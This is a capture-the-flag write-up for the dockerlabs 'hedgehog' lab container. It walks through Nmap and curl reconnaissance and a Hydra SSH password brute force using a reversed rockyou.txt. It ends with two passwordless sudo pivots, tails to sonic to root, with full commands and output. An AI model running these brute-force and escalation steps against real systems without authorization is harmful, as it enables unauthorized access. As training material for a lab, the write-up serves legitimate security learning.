# hedgehog

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| hedgehog | AnkbNikas | Very Easy | dockerlabs |

**Summary:** The hedgehog machine presented a two-service attack surface: an Apache web server on port 80 and an OpenSSH daemon on port 22. The web server's root page served a single, cryptic word: `tails`, which functioned simultaneously as a username hint and as a clue about wordlist ordering. A naive forward-traversal brute force of the SSH service yielded no results within a reasonable timeframe, because the target password resided near the tail end of the `rockyou.txt` wordlist. Reversing the wordlist with `tac` and launching Hydra against the `tails` account uncovered valid SSH credentials in under two minutes. Once inside the container as `tails`, a `sudo -l` query revealed that the account had unrestricted, passwordless `sudo` rights to execute any command as the user `sonic`. Pivoting to `sonic` with `sudo -u sonic -i` exposed a second, even broader misconfiguration: `sonic` held full passwordless `sudo` rights over every command as any user, including root. A single `sudo -i` invocation promoted the session to a root shell, completing the privilege escalation chain through two consecutive sudo misconfigurations without ever needing to crack a second password or exploit a software vulnerability.

---

## Reconnaissance

The machine was deployed via the standard dockerlabs deployment script, which assigned it the IP address `172.17.0.2`.

**1.** Deploy the target and note the assigned address:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/hedgehog]
└─$ sudo bash auto_deploy.sh hedgehog.tar
[sudo] password for ouba:

                        ##        .
                  ## ## ##       ==
               ## ## ## ##      ===
           /""""""""""""""""\___/ ===
      ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
           \______ o          __/
             \    \        __/
              \____\______/

  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]



Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2.** Set shell variables and launch a full-port versioned Nmap scan:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hedgehog]
└─$ ip=172.17.0.2 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hedgehog]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 08:09 WIB
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
|_  256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
```

The scan returned two open ports: **TCP 22** running OpenSSH 9.6p1 on Ubuntu, and **TCP 80** running Apache 2.4.58. The web server reported no page title, which suggested the root path contained minimal content worth inspecting directly.

---

## Web Enumeration and the Hidden Hint

**3.** Probe the web server root with `curl` to retrieve its full HTTP response:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hedgehog]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2026 01:10:37 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Tue, 29 Oct 2024 18:33:53 GMT
ETag: "6-625a1d3c30640"
Accept-Ranges: bytes
Content-Length: 6
Content-Type: text/html

tails
```

The entire body of the page was the single word **`tails`**. With only six bytes of content and no further routes to enumerate, this string read as an intentional hint: a potential SSH username, and possibly a signal about where the corresponding password could be found. The name "tails" also carries thematic significance within the machine's Sonic the Hedgehog motif.

---

## Credential Recovery via Reversed Wordlist Brute Force

A conventional front-to-back SSH brute force against `rockyou.txt` was attempted first. After an extended wait, no valid credential had been surfaced. The hint embedded in the page name suggested that the password was located toward the **end** of the `rockyou.txt` list, not the beginning. The wordlist was reversed using `tac` to flip the entry order, and Hydra was relaunched against the SSH service.

**4.** Reverse the `rockyou.txt` wordlist and write it to a new file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hedgehog]
└─$ tac /usr/share/wordlists/rockyou.txt | tr -d ' ' | sudo tee /usr/share/wordlists/rockyou_reversed.txt > /dev/null
```

**5.** Launch Hydra against the SSH service using username `tails` and the reversed wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hedgehog]
└─$ hydra -l tails -P /usr/share/wordlists/rockyou_reversed.txt ssh://$ip -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-11 08:27:53
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344386 login tries (l:1/p:14344386), ~3586097 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344322 to do in 3735:31h, 4 active
[22][ssh] host: 172.17.0.2   login: tails   password: 3[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-11 08:29:22
```

Valid SSH credentials were found in under ninety seconds. Reversing the wordlist proved to be the decisive tactical adjustment.

---

## Initial Access as `tails`

**6.** Connect to the machine via SSH with the recovered credentials and enumerate the user context:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hedgehog]
└─$ ssh tails@$ip
...
tails@172.17.0.2's password:
...
tails@a0eb77fb513f:~$ id
uid=1002(tails) gid=1002(tails) groups=1002(tails)
tails@a0eb77fb513f:~$ ls -la
total 28
drwxr-x--- 1 tails tails 4096 Mar 11 02:29 .
drwxr-xr-x 1 root  root  4096 Oct 29  2024 ..
-rw-r--r-- 1 tails tails  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 tails tails 3771 Mar 31  2024 .bashrc
drwx------ 2 tails tails 4096 Mar 11 02:29 .cache
-rw-r--r-- 1 tails tails  807 Mar 31  2024 .profile
```

The home directory contained only standard shell configuration files. There was no flag, no interesting binary, and no readable data worth further analysis. The natural next step was to check the account's sudo permissions.

**7.** Check the sudo policy for `tails`:

```bash
tails@a0eb77fb513f:~$ sudo -l
User tails may run the following commands on a0eb77fb513f:
    (sonic) NOPASSWD: ALL
```

The `tails` account had permission to execute any command as the user `sonic` without supplying a password. This was a direct, unguarded pathway to lateral movement.

---

## Lateral Movement to `sonic` and Privilege Escalation to Root

**8.** Switch to the `sonic` account using the sudo misconfiguration:

```bash
tails@a0eb77fb513f:~$ sudo -u sonic -i
sonic@a0eb77fb513f:~$ id
uid=1001(sonic) gid=1001(sonic) groups=1001(sonic),27(sudo)
sonic@a0eb77fb513f:~$ ls -la
total 36
drwxr-x--- 4 sonic sonic 4096 Oct 29  2024 .
drwxr-xr-x 1 root  root  4096 Oct 29  2024 ..
-rw------- 1 sonic sonic   72 Oct 29  2024 .bash_history
-rw-r--r-- 1 sonic sonic  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 sonic sonic 3771 Mar 31  2024 .bashrc
drwx------ 2 sonic sonic 4096 Oct 29  2024 .cache
-rw-r--r-- 1 sonic sonic  807 Mar 31  2024 .profile
-rw-r--r-- 1 sonic sonic    0 Oct 29  2024 .sudo_as_admin_successful
drwxr-xr-x 2 sonic sonic 4096 Oct 29  2024 Documentos
```

The presence of `.sudo_as_admin_successful` in the home directory indicated that `sonic` had previously used `sudo` successfully. More critically, `sonic` belonged to the `sudo` group (GID 27). Checking the sudo policy confirmed the worst case.

**9.** Enumerate the sudo rights for `sonic`:

```bash
sonic@a0eb77fb513f:~$ sudo -l
User sonic may run the following commands on a0eb77fb513f:
    (ALL) NOPASSWD: ALL
```

The `sonic` account could run any command as any user on the system without a password. This is an unrestricted sudo policy, the most permissive configuration possible. Escalating to root required a single command.

**10.** Escalate to root and confirm identity:

```bash
sonic@a0eb77fb513f:~$ sudo -i
root@a0eb77fb513f:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
a0eb77fb513f
root@a0eb77fb513f:~# ls -la
total 24
drwx------ 1 root root 4096 Oct 29  2024 .
drwxr-xr-x 1 root root 4096 Mar 11 02:09 ..
-rw------- 1 root root  150 Oct 29  2024 .bash_history
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root 4096 Oct 29  2024 .ssh
```

Full root access was achieved. The chained `id;whoami;hostname` command confirmed `uid=0(root)` on container host `a0eb77fb513f`.

---

## Attack Chain Summary

1. **Reconnaissance**: A full TCP port scan with Nmap identified two open services on the target: OpenSSH 9.6p1 on port 22 and Apache 2.4.58 on port 80. Both services were enumerated for their version details to inform downstream attack selection.

2. **Vulnerability Discovery**: A `curl` request to the web server root returned a six-byte response body containing only the word `tails`. This functioned as a dual hint, revealing the SSH username and signalling that the matching password was located toward the end of the standard `rockyou.txt` wordlist rather than the beginning.

3. **Exploitation**: The `rockyou.txt` wordlist was reversed with `tac` to prioritize tail-end entries. Hydra was then used to brute-force the SSH service with username `tails` and the reversed wordlist, recovering valid credentials in under two minutes.

4. **Internal Enumeration**: After logging in as `tails`, a `sudo -l` query revealed that the account could run any command as the user `sonic` without a password. The `sonic` home directory confirmed prior sudo activity, and a second `sudo -l` check showed that `sonic` held fully unrestricted, passwordless sudo rights over the entire system.

5. **Privilege Escalation**: Two sequential sudo pivots completed the escalation chain. First, `sudo -u sonic -i` moved the session from `tails` to `sonic`. Second, `sudo -i` from the `sonic` context promoted the session directly to root, requiring no password, no exploit, and no additional tooling.
